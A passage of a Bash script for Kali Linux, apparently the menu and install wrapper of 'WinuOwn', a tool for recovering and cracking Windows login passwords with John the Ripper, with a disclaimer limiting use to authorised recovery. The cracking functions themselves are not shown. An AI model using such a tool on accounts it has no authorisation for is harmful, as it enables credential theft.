    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 1)${MENU} Recover Windows login ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 2)${MENU} Remove saved Windows logins in WinuOwn-folder ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 3)${MENU} Restore previous session  ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 4)${MENU} Show cracked passwords ${NORMAL}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*****************WinuOwn*By*Webbhatt**************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter a menu option and enter or ${RED_TEXT}enter to exit. ${NORMAL}"
    read opt
    while [ opt != '' ]
    do
    if [[ $opt = "" ]]; then 
            exit;
    else
        case $opt in
        1) clear;
        option_picked "will now start Windows login recovery";
        thesstart_fn;
        ;;

        2) clear;
            option_picked "Removing files";
            remove_fn;
            ;;

        3) clear;
            option_picked "Restoring session";
            restore_fn
            ;;

        4) clear;
            option_picked "Showing stored passwords";
            oldpass_fn;
            ;;

        x)exit;
        ;;

        \n)exit;
        ;;

        *)clear;
        option_picked "Pick an option from the menu";
        show_menu;
        ;;
    esac
fi
done
}
function option_picked() {
    COLOR='\033[01;31m' # bold red
    RESET='\033[00;00m' # normal white
    MESSAGE=${@:-"${RESET}Error: No message passed"}
    echo -e "${COLOR}${MESSAGE}${RESET}"
}
clear
####################################menu_for_etc###########################################################
show_etcmenu(){
    echo -e "${INTRO_TEXT} WinuOwn is a Windows passwords recovery tool    ${INTRO_TEXT}"
    echo -e "${INTRO_TEXT}created for Kali linux by Pierre from Webbhatt  ${INTRO_TEXT}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*****************WinuOwn*By*Webbhatt**************${NORMAL}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 1)${MENU} Recover Windows login ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 2)${MENU} Remove saved Windows logins in WinuOwn-folder ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 3)${MENU} Restore previous session  ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 4)${MENU} Show cracked passwords ${NORMAL}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*****************WinuOwn*By*Webbhatt**************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter a menu option and enter or ${RED_TEXT}enter to exit. ${NORMAL}"
    read opt
    while [ opt != '' ]
    do
    if [[ $opt = "" ]]; then 
            exit;
    else
        case $opt in
        1) clear;
        option_picked "will now start Windows login recovery";
        thesstartetc_fn;
        ;;

        2) clear;
            option_picked "Removing files";
            removeetc_fn;
            ;;

        3) clear;
            option_picked "Restoring session";
            restoreetc_fn
            ;;

        4) clear;
            option_picked "Showing stored passwords";
            oldpassetc_fn;
            ;;

        x)exit;
        ;;

        \n)exit;
        ;;

        *)clear;
        option_picked "Pick an option from the menu";
        show_etcmenu;
        ;;
    esac
fi
done
}
function option_picked() {
    COLOR='\033[01;31m' # bold red
    RESET='\033[00;00m' # normal white
    MESSAGE=${@:-"${RESET}Error: No message passed"}
    echo -e "${COLOR}${MESSAGE}${RESET}"
}

#########################################pre-install##############################################

newworld_fn()
{

if [ -d /etc/WinuOwn ]
then 
 if [ -d /root/.john ]
 then 
 show_menu
 else
 show_etcmenu
 fi
else
echo -e "${INFOS}                                                                           ${END}"
echo -e "${INFOS}  This script is written by Pierre a.k.a Linoge, admin of Webbhatt         ${END}"
echo -e "${INFOS}                                                                           ${END}"
echo -e "${INFOS}                                                                           ${END}"
echo -e "${INFOS}  WinuOwn will create WinuOwn-folder in /etc/ were files will be saved     ${END}"
echo -e "${INFOS}           and if if necessary ask to install other programs               ${END}"
echo -e "${INFOS}                                                                           ${END}"
echo -e "${WARNING}    Disclaimer: This script is intended for use only for private study     ${END}"
echo -e "${WARNING} or during an authorised recovery, The author bears no responsibility      ${END}"
echo -e "${WARNING}                  for malicious or illegal use.                            ${END}"
echo -e "${WARNING}                 Skiddies should look elsewhere.                           ${END}"
   read -p 'you agree to the terms? ? (y/n)?' yn
   case $yn in
    [Yy]* ) clear
            update_fn;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
clear
echo 'Please answer yes or no.'
newworld_fn
fi
}

update_fn()
{
if [ -d /root/.Winpwn ]
then 
echo -e "${INFOS} You have an old version of WinuOwn installed on this device (WinPwn) ${END}"
read -p 'Would you like me to delete the old folder and all the data (y/n)?' yn
   case $yn in
    [Yy]* ) rmdir --ignore-fail-on-non-empty /root/.Winpwn
            clear
            show_install;; 
            
    [Nn]* ) clear 
           show_install;;
           
    * ) echo 'Please answer yes or no.';;
   esac
clear
echo 'Please answer yes or no.'
else
show_install
fi
}
#############################################Options##################################################
newworld_fn
